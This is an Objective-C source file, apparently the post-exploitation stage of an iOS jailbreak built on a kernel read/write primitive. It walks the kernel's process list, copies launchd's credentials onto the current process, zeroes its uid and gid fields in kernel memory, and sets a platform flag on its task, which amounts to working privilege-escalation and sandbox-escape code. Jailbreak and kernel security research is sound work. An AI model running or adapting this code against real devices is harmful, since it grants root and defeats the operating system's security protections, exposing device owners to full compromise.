//
//  post_exp.m
//  escape
//
//  Created by Xiao on 2023/11/9.
//

#import <Foundation/Foundation.h>
#import "post_exp.h"
#import "objcLogger.h"
#import "offsets.h"
#import "libkfd.h"
#import "krw.h"
#import "kcall.h"
#import "kpf.h"

uint64_t __kfd = 0;

static void platformize(uint64_t proc, uint64_t task) {
    uint32_t t_flags = kread32(task + off_task_t_flags);
    // LOG_FMT(@"[*] task_t->flags: 0x%x", t_flags);
    t_flags |= 0x00000400;
    kwrite32(task + off_task_t_flags, t_flags);
    LOG_FMT(@"[*] task_t->flags: 0x%x", kread32(task + off_task_t_flags));
}

uint64_t proc_for_pid(uint32_t pid) {
    uint64_t proc = ((struct kfd *)__kfd)->info.kernel.kernel_proc;
    
    while (1) {
        if(kread32(proc + off_p_pid) == pid) {
            return proc;
        }
        proc = kread64(proc + off_p_list_le_prev);
        if(!proc) {
            return -1;
        }
    }
    return -1;
}

uint64_t proc_for_name(const char *proc_name) {
    uint64_t proc = ((struct kfd *)__kfd)->info.kernel.kernel_proc;
    char str[0x100] = { 0 };
    while(1) {
        kread_string(proc + off_p_name, str);
        if(!strcmp(str, proc_name)) {
            return proc;
        }
        proc = kread64(proc + off_p_list_le_prev);
        if(!proc) {
            return -1;
        }
    }
    return -1;
}

uint64_t cred_for_proc(uint64_t proc) {
    uint64_t proc_ro = kread64(proc + 0x20);
    uint64_t proc_cred_ro = kread64(proc_ro + 0x20);
    return proc_cred_ro;
}

void get_root(uint32_t pid) {
    uint64_t proc = proc_for_pid(pid);
    uint64_t launchd_cred = cred_for_proc(proc_for_pid(1));
    
    kcall(off_proc_set_ucred, proc, launchd_cred, 0, 0, 0, 0, 0);
}

void post_exp(uint64_t f) {
    LOG(@"[*] start post exploitation");
    
    struct kfd *kfd = (struct kfd *)f;
    __kfd = f;
    
    _offsets_init();
    // kernel_slide = kfd->info.kernel.kernel_slide;

    int cur_uid = getuid();
    int target_uid = 0;

    LOG_FMT(@"[*] current uid: %d", cur_uid);

    uint64_t p_name_addr = off_p_name + kfd->info.kernel.current_proc;
    for (int i = 0; i < 0x3; ++i) {
        usleep(300);
        uint64_t data = 0;
        kread(f, p_name_addr + i * 8, &data, sizeof(data));
        LOG_FMT(@"[*] test kread %s", (char *)&data);
    }
    
    usleep(300);
    kread(f, off_p_uid + kfd->info.kernel.current_proc, &cur_uid, sizeof(int));

    usleep(300);
    kread(f, off_p_uid + kfd->info.kernel.current_proc, &cur_uid, sizeof(int));
    
    target_uid = 0;
    kwrite(f, &target_uid, off_p_gid + kfd->info.kernel.current_proc, sizeof(int));
    target_uid = 0;
    kwrite(f, &target_uid, off_p_ruid + kfd->info.kernel.current_proc, sizeof(int));
    target_uid = 0;
    kwrite(f, &target_uid, off_p_rgid + kfd->info.kernel.current_proc, sizeof(int));

    uint32_t d32 = 0;
    uint64_t d64 = 0;
    d32 = kread32(off_p_uid + kfd->info.kernel.current_proc);
    LOG_FMT(@"[*] kread(off_p_uid)=%d", d32);
    d32 = kread32(off_p_gid + kfd->info.kernel.current_proc);
    LOG_FMT(@"[*] kread(off_p_gid)=%d", d32);
    d32 = kread32(off_p_ruid + kfd->info.kernel.current_proc);
    LOG_FMT(@"[*] kread(off_p_ruid)=%d", d32);
    d32 = kread32(off_p_rgid + kfd->info.kernel.current_proc);
    LOG_FMT(@"[*] kread(off_p_rgid)=%d", d32);
    
    BOOL r = kcall_init(kfd);
    if (!r) {
        LOG(@"[-] kcall_init failed");
        return;
    }
    
    get_root(getpid());

    kwrite32(off_p_uid + kfd->info.kernel.current_proc, 0);
    kwrite32(off_p_gid + kfd->info.kernel.current_proc, 0);
    kwrite32(off_p_ruid + kfd->info.kernel.current_proc, 0);
    kwrite32(off_p_rgid + kfd->info.kernel.current_proc, 0);

    d32 = kread32(off_p_uid + kfd->info.kernel.current_proc);
    LOG_FMT(@"[*] p_uid=%d", d32);
    d32 = kread32(off_p_gid + kfd->info.kernel.current_proc);
    LOG_FMT(@"[*] p_gid=%d", d32);
    d32 = kread32(off_p_ruid + kfd->info.kernel.current_proc);
    LOG_FMT(@"[*] p_ruid=%d", d32);
    d32 = kread32(off_p_rgid + kfd->info.kernel.current_proc);
    LOG_FMT(@"[*] p_rgid=%d", d32);
    
    LOG_FMT(@"[*] getuid()=%d", getuid());
    platformize(kfd->info.kernel.current_proc, kfd->info.kernel.current_task);
    
    NSString *tar_trustcache_path = [NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/iosbinpack/tar.tc"];
    LOG_FMT(@"[*] tar_trustcache_path: %@", tar_trustcache_path);

    return;
}

int cs_bypass() {
    return 0;
}
